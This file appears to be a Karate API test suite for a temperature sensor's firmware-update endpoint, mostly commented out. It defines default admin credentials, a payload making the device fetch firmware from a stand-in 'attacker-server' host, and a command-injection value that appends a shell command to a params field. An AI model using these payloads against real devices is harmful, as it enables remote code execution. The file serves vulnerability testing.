Feature: Test Temperature Sensor Firmware Update Vulnerability

Background:
  * url 'http://192.168.1.109:12384' 
  # Using temperature-sensor-04 as example
  * def validAuth = {username: 'admin', password: 'admin'}
  * def invalidAuth = {username: 'user', password: 'wrongpass'}
  * def validUpdatePayload = { "firmware_url": "http://attacker-server:63999/dummy.sh", "version": "1.2.3" }
  * def commandInjectionPayload = { "firmware_url": "http://attacker-server:63999/dummy.sh", "version": "1.2.3", "params": "; echo VULNERABLE > /tmp/vuln_test.txt" }

Scenario: Attempt firmware update without authentication
  Given path '/firmware/update'
  And request validUpdatePayload
  When method post
  Then status 401
  And match response.error == 'Unauthorized'

# The following requires that attack-server to be online
# Scenario: Attempt firmware update with invalid credentials
#   Given path '/firmware/update'
#   And request validUpdatePayload
#   And header Authorization = call invalidAuth
#   When method post
#   Then status 401
#   And match response.error == 'Unauthorized'

# Scenario: Successful firmware update with valid credentials
#   Given path '/firmware/update'
#   And request validUpdatePayload
#   And header Authorization = call validAuth
#   When method post
#   Then status 200
#   And match response.status == 'success'
#   And match response.message == 'Firmware updated successfully'
#   And match response.new_version == '1.2.3'

# Scenario: Command injection vulnerability in firmware update
#   Given path '/firmware/update'
#   And request commandInjectionPayload
#   And header Authorization = call validAuth
#   When method post
#   Then status 200
#   And match response.status == 'success'
#   # The following check verifies the command injection vulnerability exists
#   And match response.command contains "/bin/bash"
#   And match response.command contains "echo VULNERABLE > /tmp/vuln_test.txt"

# Scenario: Verify firmware version after update
#   Given path '/firmware/version'
#   When method get
#   Then status 200
#   And match response.version == '1.2.3'
#   And match response.sensor_id == 'TEMP004'